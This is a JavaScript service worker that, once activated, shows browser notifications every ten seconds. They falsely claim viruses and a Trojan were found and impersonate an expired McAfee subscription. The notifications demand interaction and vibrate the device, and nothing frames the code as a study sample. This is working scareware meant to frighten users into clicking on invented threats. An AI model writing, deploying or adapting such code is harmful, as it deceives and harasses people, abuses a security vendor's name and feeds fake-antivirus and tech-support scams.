const notifications = [
    { title: "⚠️ WARNING: 5 Viruses Found!", body: "Click to clean your PC immediately!" },
    { title: "McAfee Subscription Expired", body: "Your protection has ended. Renew now!" },
    { title: "🚨 Critical Security Alert", body: "Trojan detected. Action required!" }
];

self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', event => {
    event.waitUntil(self.clients.claim());
    let i = 0;
    setInterval(() => {
        const n = notifications[i % notifications.length];
        self.registration.showNotification(n.title, {
            body: n.body,
            icon: 'https://picsum.photos/id/237/128/128',
            requireInteraction: true,
            vibrate: [400, 100, 400]
        });
        i++;
    }, 10000);
});
